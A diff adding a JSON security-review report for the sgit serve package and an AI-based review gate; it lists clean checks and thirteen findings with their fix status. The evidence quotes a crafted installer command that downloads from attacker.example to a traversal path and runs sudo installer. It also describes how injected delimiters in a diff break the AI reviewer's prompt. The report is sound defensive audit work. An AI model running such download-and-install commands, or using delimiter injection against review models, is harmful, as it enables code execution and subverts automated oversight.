@@ -1,0 +1,192 @@
+{
+ "tool": "differential-review (Trail of Bits skill, run by a subagent)",
+ "run": "2026-10-13",
+ "range": "81a4176..origin/dev plus the sgit serve package (b32a6ba, an ancestor)",
+ "summary": "serve runtimes, static server, mirror, container copy and the CI workflow clean on the trust-boundary questions; defects in trust decisions on host and model answers (installer, AI gate)",
+ "clean": [
+  "every subprocess call is an argv list with fixed verbs; no shell",
+  "loopback rule fails safe for localhost.attacker.example, 127.0.0.1.nip.io, 0.0.0.0, [::ffff:127.0.0.1], 127.1, user@localhost",
+  "static server: loopback bind, symlinks and .sg_vault refused, traversal refused, Host check, writes 405",
+  "mirror pull refuses rewinds, undecryptable and unknown heads; baselines byte-identical; objects verified before write; signature policy applied",
+  "only .sg_vault/bare/* is uploaded to the container; .sg_vault/local never read, uploaded or mounted; container runs as the host uid; no env secrets",
+  "CI: pull_request not pull_request_target; no ${{ }} inside run:; env-only inputs; set -f with unquoted $EXTRA_PACKAGES is correct; persist-credentials false on all 11 read-only checkouts; actions SHA-pinned; zizmor medium 0; actionlint clean",
+  "ai_review: exit 3 fails the job; exceptions exit 2; inconclusive verify keeps findings; model output never executed",
+  "TM-R36 row matches the code"
+ ],
+ "findings": [
+  {
+   "id": "DR2-001",
+   "file": "sgit_ai/core/serve/Container__Runtime__Installer.py",
+   "line": 176,
+   "severity": "medium",
+   "confidence": 0.85,
+   "status": "FIXED",
+   "register": [
+    "TM-R40"
+   ],
+   "title": "the installer executed an unvalidated release-API answer as root (asset name used as a path, URL passed to curl unchecked, then sudo installer)",
+   "evidence": "monkeypatched urlopen with crafted JSON: the plan printed curl -fL -o /tmp/../../Users/victim/Library/LaunchAgents/evil.pkg http://attacker.example/evil.pkg then sudo installer -pkg ... -target /",
+   "resolved": "checked_asset(): plain file name with the expected suffix, served from https://github.com/<owner>/<repo>/releases/download/ of the repository the API URL names; still no checksum (open)"
+  },
+  {
+   "id": "DR2-002",
+   "file": "review/tools/ai_review.py",
+   "line": 198,
+   "severity": "medium",
+   "confidence": 0.95,
+   "status": "FIXED",
+   "register": [],
+   "title": "any register value other than exactly \"new\" (empty, none, n/a, a non-existent TM id) exempted a finding from the gate",
+   "evidence": "critical/0.99 finding with register \"\", \" \", \"none\", \"n/a\", \"TM-R999\": not gated",
+   "resolved": "is_new(): exempt only for ^TM-[FR]\\d+$ that occurs in the threat model text; unit tests"
+  },
+  {
+   "id": "DR2-003",
+   "file": "review/tools/ai_review.py",
+   "line": 137,
+   "severity": "medium",
+   "confidence": 0.9,
+   "status": "FIXED (partly)",
+   "register": [],
+   "title": "data delimiters not escaped: a diff containing </change> closes the block; design inputs (intent, threat model, dossiers, slice, waivers) are read from the PR head",
+   "evidence": "git stubbed to return a diff with </change> and a fake <file> tag: user_text() contained two closers",
+   "resolved": "per-run nonce in the tag names; reading the design from the base commit and guarding those paths is still open (DR2-004)"
+  },
+  {
+   "id": "DR2-004",
+   "file": ".github/workflows/security.yml",
+   "line": 50,
+   "severity": "low",
+   "confidence": 0.9,
+   "status": "OPEN",
+   "register": [
+    "TM-R21"
+   ],
+   "title": "every gate is self-attesting: a PR can grow the Bandit baseline, add a zizmor ignore or a waiver, shrink the slice, or add nosec/nosemgrep in the same change",
+   "evidence": "structural",
+   "resolved": "",
+   "proposed": "CODEOWNERS on those paths; a step that warns or fails when the PR touches them or adds markers"
+  },
+  {
+   "id": "DR2-005",
+   "file": "review/tools/ai_review.py",
+   "line": 181,
+   "severity": "low",
+   "confidence": 0.9,
+   "status": "FIXED (partly)",
+   "register": [],
+   "title": "waiver fingerprint file|function|category is coarse; an empty function made a waiver file-wide for its category",
+   "evidence": "two unrelated findings in one function/category share an id; empty function gives a file-wide id",
+   "resolved": "empty function falls back to the normalised title; the coarse key is kept on purpose (waivers survive rewording); no expiry yet"
+  },
+  {
+   "id": "DR2-006",
+   "file": "sgit_ai/core/serve/Vault__Serve__Mirror.py",
+   "line": 113,
+   "severity": "low",
+   "confidence": 0.9,
+   "status": "OPEN",
+   "register": [
+    "TM-R39"
+   ],
+   "title": "serve push re-sends the branch index as a plain write every push: a branch or tag created in the browser is lost on the next serve push",
+   "evidence": "after writing a changed index on the in-memory host, mirror.push() replaced it unconditionally",
+   "proposed": "write-if-match the index against the server copy, or merge it as sgit push does"
+  },
+  {
+   "id": "DR2-007",
+   "file": "sgit_ai/core/serve/Vault__Serve.py",
+   "line": 29,
+   "severity": "low",
+   "confidence": 0.85,
+   "status": "KNOWN",
+   "register": [
+    "TM-R38",
+    "TM-R21"
+   ],
+   "title": "unpinned image (:latest), package (uv run --with sgraph-ai-app-send) and installer scripts (get.docker.com, astral.sh) with no checksums; the banner hands the read key to the local UI, so a hostile image gets plaintext",
+   "evidence": "code reading",
+   "resolved": "TM-R38 row corrected; pinning is open"
+  },
+  {
+   "id": "DR2-008",
+   "file": "sgit_ai/core/serve/Container__Runtime__Installer.py",
+   "line": 64,
+   "severity": "low",
+   "confidence": 0.6,
+   "status": "FIXED",
+   "register": [
+    "TM-R40"
+   ],
+   "title": "predictable shared-tmp paths for downloads that are then run as root",
+   "evidence": "not reproduced (protected_regular on modern Linux; per-user TMPDIR on macOS)",
+   "resolved": "download_dir(): tempfile.mkdtemp(prefix=sgit-serve-install-)"
+  },
+  {
+   "id": "DR2-009",
+   "file": "sgit_ai/cli/CLI__Serve.py",
+   "line": 159,
+   "severity": "low",
+   "confidence": 0.9,
+   "status": "FIXED",
+   "register": [
+    "TM-R39"
+   ],
+   "title": "only the literal 0.0.0.0 triggered the exposure warning",
+   "evidence": "code reading",
+   "resolved": "_is_loopback_bind(): ipaddress.is_loopback, else warn"
+  },
+  {
+   "id": "DR2-010",
+   "file": "team/explorer/appsec/threat-model/v0.21.0__threat-model.md",
+   "line": 209,
+   "severity": "low",
+   "confidence": 1.0,
+   "status": "FIXED",
+   "register": [
+    "TM-R41"
+   ],
+   "title": "two rows were numbered TM-R38 (the walk-up ceiling and the serve image)",
+   "evidence": "grep",
+   "resolved": "the walk-up row is TM-R41; test, ranking and records updated"
+  },
+  {
+   "id": "DR2-011",
+   "file": "sgit_ai/core/serve/Vault__Serve.py",
+   "line": 152,
+   "severity": "info",
+   "confidence": 0.9,
+   "status": "OPEN",
+   "register": [],
+   "title": "--image, --bind and --data reach the runtime argv untyped (typed only when the state is saved); a value starting with - is a single argv element docker rejects",
+   "evidence": "repro_argv.py",
+   "proposed": "type at Vault__Serve.start(); make Safe_Str__Bind_Address strict; refuse \":\" in data_dir for docker-like runtimes"
+  },
+  {
+   "id": "DR2-012",
+   "file": "sgit_ai/core/serve/Vault__Serve.py",
+   "line": 65,
+   "severity": "info",
+   "confidence": 0.8,
+   "status": "OPEN",
+   "register": [
+    "TM-R38"
+   ],
+   "title": "files the container can write (.sgit-sent.json; with --data, the state file) are read back as control",
+   "evidence": "reasoning from places()",
+   "proposed": "keep state and the sent-record outside the mounted folder"
+  },
+  {
+   "id": "DR2-013",
+   "file": "review/tools/ai_review.py",
+   "line": 257,
+   "severity": "info",
+   "confidence": 0.9,
+   "status": "FIXED",
+   "register": [],
+   "title": "model output written unescaped into GITHUB_STEP_SUMMARY",
+   "evidence": "[see](https://evil.example) <img src=x> rendered verbatim",
+   "resolved": "titles, files and register rendered as code spans"
+  }
+ ]
+}
